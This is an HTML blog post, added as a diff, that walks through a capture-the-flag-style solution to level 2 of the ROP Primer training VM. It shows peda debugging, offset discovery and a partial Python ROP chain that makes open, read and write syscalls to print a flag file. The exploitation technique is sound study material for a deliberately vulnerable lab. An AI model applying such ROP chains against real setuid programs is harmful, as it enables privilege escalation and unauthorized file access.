@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="de-de">
+
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="chrome=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+<meta name="description" content="Don&#39;t panic">
+
+<base href="http://robinverton.de/">
+<title>
+
+
+     Solving ROP primer level2 
+
+</title>
+<link rel="canonical" href="http://robinverton.de/blog/2016/11/04/solving-rop-primer-level2/">
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.8.0/styles/default.min.css">
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700|Ubuntu+Mono:400,400i,700,700i|Raleway:500">
+
+
+
+    
+    <link rel="stylesheet" href="http://robinverton.de/css/reset.css?t=1487071984">
+    <link rel="stylesheet" href="http://robinverton.de/css/pygments.css?t=1487071984">
+    <link rel="stylesheet" href="http://robinverton.de/css/main.css?t=1487071984">
+    
+        <link rel="stylesheet" href="http://robinverton.de/css/override.css?t=1487071984">
+    
+
+
+
+
+<link rel="shortcut icon"
+
+    href="http://robinverton.de/img/leaf.ico"
+
+>
+
+
+
+
+
+
+</head>
+
+
+<body lang="en">
+
+<section class="header">
+    <div class="container">
+        <div class="content">
+            
+            <a href="http://robinverton.de/"><div class="name">Robin Verton</div></a>
+            
+            <nav>
+                <ul>
+                    <li class="nav-blog"><a href="http://robinverton.de/blog/">Blog</a></li>
+                    
+                    <li class="nav-code"><a href="http://robinverton.de/code/">Code</a></li>
+                </ul>
+            </nav>
+        </div>
+    </div>
+</section>
+
+<section class="icons">
+    <div class="container">
+        <div class="content">
+
+        
+            <a href="//github.com/rverton" target="_blank" rel="noopener"><img class="icon" src="http://robinverton.de/img/github.svg" alt="github" /></a>
+        
+
+        
+            <a href="//twitter.com/robinverton" target="_blank" rel="noopener"><img class="icon" src="http://robinverton.de/img/twitter.svg" alt="twitter" /></a>
+        
+
+        
+
+        
+
+        
+
+        
+            <a href="mailto:hello@robinverton.de"><img class="icon" src="http://robinverton.de/img/email.svg" alt="email" /></a>
+        
+
+        
+            <a href="http://robinverton.de/index.xml"><img class="icon" src="http://robinverton.de/img/rss.svg" alt="rss" /></a>
+        
+        </div>
+    </div>
+</section>
+
+
+<section class="main post non-narrow zero-top-spacing">
+    <div class="container">
+        <div class="content">
+            <div class="front-matter">
+                <div class="title-container">
+                    <div class="page-heading">
+
+    Solving ROP primer level2
+
+</div>
+
+                    <div class="initials"><a href="http://robinverton.de/"></a></div>
+                </div>
+                <div class="meta">
+                    
+                    <div class="date" title='Fri Nov 4 2016 16:01:51 CET'>Nov 4, 2016</div>
+                    
+                    
+                    <div class="reading-time"><div class="middot"></div>5 minutes read</div>
+                    
+                </div>
+            </div>
+            <div class="markdown">
+                
+
+<p>Some days ago I started reading into Return Oriented Programming and had a lot of fun doing some VMs and exercises I found over the internet. ROP is a technique which allows attackers to execute code in the presence of defense mechanism like DEP/NX. I&rsquo;m not explaining what ROP is and how it is done, because a lot of other people <a href="http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html">have done this already</a>.</p>
+
+<p>Instead I want to share a solution I made for the second level of a VM called <a href="https://www.vulnhub.com/entry/rop-primer-02,114/">ROP Primer v0.2</a>. Most <a href="https://xmgv.wordpress.com/2015/08/17/rop-primer-level-2/">other</a> <a href="http://blog.the-playground.dk/2015/08/rop-primer-v02-level-2.html">posts</a> about this level I found spawned a shell, allowing the flag to be read manually. For learning purposes I took a slightly different approach: opening the flag, reading the content to memory and then printing it to <code>STDOUT</code>.</p>
+
+<p>First of all, let&rsquo;s gather some information on the binary:</p>
+
+<pre><code class="language-bash">level2@rop:~$ file level2
+level2: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.26, BuildID[sha1]=baba7f4fd049424caed048eb73eb6668b45a962e, not stripped
+level2@rop:~$ gdb -q level2
+Reading symbols from level2...(no debugging symbols found)...done.
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : disabled
+gdb-peda$
+</code></pre>
+
+<p>The already installed <em>peda</em> on this VM shows that No-Execute (NX) is enabled.</p>
+
+<p>Looking at the source of this level (you find this by browsing to the web server exposed by this VM), triggering a crash is pretty straight forward:</p>
+
+<pre><code class="language-bash">gdb-peda$ r $(python -c &quot;print 'A'*100&quot;)
+Starting program: /home/level2/level2 $(python -c &quot;print 'A'*100&quot;)
+[+] ROP tutorial level2
+[+] Bet you can't ROP me this time around, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
+[...snip...]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41414141 in ?? ()
+</code></pre>
+
+<p>Let&rsquo;s use pedas <code>pattern</code> functions to find the offset:</p>
+
+<pre><code>gdb-peda$ pattern arg 100
+Set 1 arguments to program
+gdb-peda$ r
+Starting program: /home/level2/level2 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+[+] ROP tutorial level2
+[+] Bet you can't ROP me this time around, AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL!
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x0
+EBX: 0x0
+ECX: 0xbffff61c --&gt; 0x80ca4c0 --&gt; 0xfbad2a84
+EDX: 0x80cb430 --&gt; 0x0
+ESI: 0x80488f0 (&lt;__libc_csu_fini&gt;:	push   ebp)
+EDI: 0x580c099e
+EBP: 0x41304141 ('AA0A')
+ESP: 0xbffff670 (&quot;bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;)
+EIP: 0x41414641 ('AFAA')
+EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41414641
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff670 (&quot;bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;)
+0004| 0xbffff674 (&quot;AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;)
+0008| 0xbffff678 (&quot;AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;)
+0012| 0xbffff67c (&quot;2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;)
+0016| 0xbffff680 (&quot;AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;)
+0020| 0xbffff684 (&quot;A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;)
+0024| 0xbffff688 (&quot;IAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;)
+0028| 0xbffff68c (&quot;AA4AAJAAfAA5AAKAAgAA6AAL&quot;)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41414641 in ?? ()
+gdb-peda$ pattern offset 0x41414641
+1094796865 found at offset: 44
+</code></pre>
+
+<p>Great, so we can overwrite EIP at <strong>45-48</strong>. Because NX is set, we can not just push some shellcode and lead our control flow to this address. Instead we need to construct our logic by using some gadgets we can find. A really usefull site I used for this is <a href="http://ropshell.com">ropshell.com</a>.</p>
+
+<p>Because a <code>strcpy</code> is used to copy our argument into the buffer, we can&rsquo;t use NULL-Bytes here, making this a bit more complex. Let&rsquo;s go.</p>
+
+<h4 id="what-file-should-we-read">What file should we read?</h4>
+
+<p>To <code>open()</code> a file, we need to set two arguments: a path and a mode. The path is just the filename &lsquo;flag&rsquo;. Let&rsquo;s put this into memory first. But where should we place this? We need to find a writeable memory space which address we know. Again, peda can help us here:</p>
+
+<pre><code>gdb-peda$ vmmap
+Start      End        Perm	Name
+0x08048000 0x080ca000 r-xp	/home/level2/level2
+0x080ca000 0x080cb000 rw-p	/home/level2/level2
+0x080cb000 0x080ef000 rw-p	[heap]
+0xb7ffe000 0xb7fff000 rw-p	mapped
+0xb7fff000 0xb8000000 r-xp	[vdso]
+0xbffdf000 0xc0000000 rw-p	[stack]
+</code></pre>
+
+<p><code>0x080ca000</code> is writeable, let&rsquo;s use this. Because this address contains a NULL-Byte, we can just increase it to <code>0x080ca004</code>.</p>
+
+<p>Next we need to bring the string <code>flag</code> into memory. To do this, we need to do three things:</p>
+
+<ol>
+<li>Put the address where we want to save this in a register</li>
+<li>pop the string on the stack</li>
+<li>move the string to the address the register from (1) is pointing to.</li>
+</ol>
+
+<p>The only suitable gadget I found to move was a <code>mov [eax], edx; pop ebx; pop ebp; ret</code>, so we also have to push some dummy on the stack. After this I am pushing a \0 to the end of the string to null terminate it:</p>
+
+<pre><code>payload += p(pop_eax)
+payload += p(writeable_buffer)  # 0x080ca004
+payload += p(pop_edx)
+payload += 'flag'
+payload += p(mov_eax_edx)
+payload += 'AAAA'               # dummy for pop ebx
+payload += 'AAAA'               # dummy for pop ebp
+
+# Null-terminate flag string
+payload += p(xor_eax_eax)
+payload += p(pop_edx)
+payload += p(writeable_buffer+0x4)
+payload += p(mov_edx_eax)
+</code></pre>
+
+<p>Great, let&rsquo;s set a breakpoint and see if this worked:</p>
+
+<pre><code>gdb-peda$ x/s 0x080ca004
+0x80ca004:	&quot;flag&quot;
+</code></pre>
+
+<p>Awesome. <em>Note:</em> When you run your scripts from gdb, make sure to use quotation marks for your arguments. Otherwise you will get problems when using chars like <code>\x0a</code> or <code>\x09</code>.. I learned this the hard way.</p>
+
+<h4 id="opening-the-flag-file">Opening the flag file</h4>
+
+<p>If you take a look at <a href="http://syscalls.kernelgrok.com/">Linux Syscall Reference</a> you can see the register values we need:</p>
+
+<p><img src="http://robinverton.de/static/rop-primer-1.png" alt="" /></p>
+
+<p>Because we can&rsquo;t put a NULL-byte in there and <code>0x05</code> is popped as <code>\x05\x00\x00\x00</code>, we need to get a bit creative here. A simple approach to work around this is pop&rsquo;ing <code>0xffffffff</code> (-1) and then increasing this value step by step to get to 5 with <code>inc reg</code>.</p>
+
+<p>After all our registers are set up, we use the address of a <code>int 0x80</code> to execute this syscall:</p>
+
+<pre><code># 2/ open file
+# open(pathname, flags)
+# eax=0x05, ebx = filename, ecx = flags
+
+payload += p(pop_ecx_pop_ebx)
+payload += p(0xffffffff)        # ecx = -1
+payload += p(writeable_buffer)  # ebx = address of 'flag'
+payload += p(inc_ecx)           # ebx = 0
+
+payload += p(xor_eax_eax)
+payload += p(inc_eax)           # eax = 1
+payload += p(inc_eax)           # eax = 2
+payload += p(inc_eax)           # eax = 3
+payload += p(inc_eax)           # eax = 4
+payload += p(inc_eax)           # eax = 5
+
+payload += p(int_0x80)          # GO!
+</code></pre>
+
+<h4 id="read-from-file-write-to-stdout">Read from file, write to STDOUT</h4>
+
+<p>We now use the same technique for calling <code>sys_read</code> and <code>sys_write</code>. Because file descriptors 0 (STDIN), 1 (STDOUT), 2 (STDERR) are predefined, our recently opened file will be accessible at FD <code>3</code>. To print to STDOUT we can then use FD <code>2</code>.</p>
+
+<p><img src="http://robinverton.de/static/rop-primer-2.png" alt="" /></p>
+
+<p>After executing our exploit, we can see the flag printed to stdout (surrounded with some garbage):</p>
+
+<pre><code>level2@rop:~$ ./level2 &quot;$(python exploit2.py)&quot;
+[+] ROP tutorial level2
+[+] Bet you can't ROP me this time around, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAց
+[...snip...]
+flag{to_rop_or_not_to_rop}
+[...snip...]
+</code></pre>
+
+<p>You can find my full finished exploit here:
+<a href="https://gist.github.com/rverton/42340ee4bd3482c6262db2bc9bbb9ef5">https://gist.github.com/rverton/42340ee4bd3482c6262db2bc9bbb9ef5</a></p>
+
+                <br>
+                <p><a href="http://robinverton.de/blog/">Back to posts</a></p>
+            </div>
+            <br>
+            <div class="disqus">
+                
+            </div>
+        </div>
+    </div>
+</section>
+
+
+
+
+
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.8.0/highlight.min.js"></script>
+  
+
+  <script type="text/javascript">
+    hljs.initHighlightingOnLoad();
+  </script>
+
+
+
+</body>
+</html>
+
